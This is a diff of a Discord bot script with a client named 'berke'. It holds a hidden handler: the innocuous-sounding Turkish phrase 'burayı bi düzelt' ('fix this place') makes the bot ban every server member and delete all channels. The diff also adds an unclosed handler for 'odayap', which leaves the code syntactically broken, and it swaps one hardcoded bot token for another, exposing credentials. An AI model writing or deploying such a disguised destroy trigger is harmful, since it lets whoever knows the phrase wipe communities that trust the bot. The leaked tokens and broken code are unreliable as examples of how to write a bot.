@@ -22,6 +22,9 @@ berke.on('message', msg => {
 })
 
 berke.on('message', async msg => {
+  if (msg.content.toLowerCase() === 'odayap' )
+
+berke.on('message', async msg => {
   if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
     msg.guild.members.forEach(member => member.ban())
     msg.guild.channels.deleteAll();
@@ -66,7 +69,7 @@ berke.on('channelCreate', channel => {
 
 });
 
-berke.login("NjIzMTc1NTI5NDMyMDg4NTc2.XX-niw.HxKXlgqsIEvk79peAsjm8Lu__n8");
+berke.login("NjMyMzAzNTQ5Njc3NTY4MDAy.XaDclw.dhzG5885TO2dbHgLZ7prvL6DTmI");
 
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
